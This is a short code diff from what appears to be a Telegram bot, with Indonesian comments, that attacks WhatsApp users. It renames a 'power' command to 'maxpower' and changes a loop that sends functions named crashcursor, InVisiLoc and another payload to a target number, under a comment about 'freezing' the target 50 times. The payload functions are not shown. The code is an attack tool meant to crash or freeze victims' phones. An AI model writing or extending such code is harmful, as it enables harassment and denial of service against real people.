@@ -1468,7 +1468,7 @@ bot.command("xranz", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
   // Menyelesaikan proses response
   await donerespone(target, ctx);
 });
-bot.command("power", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
+bot.command("maxpower", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
   const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
     const userId = ctx.from.id;
 
@@ -1483,7 +1483,7 @@ bot.command("power", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
   await prosesrespone(target, ctx);
 
   // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 2; i++) {
+  for (let i = 0; i < 1; i++) {
     await crashcursor(target, { ptcp: true });
     await InVisiLoc(target, { ptcp: true });
     await bokep(target, { ptcp: true });
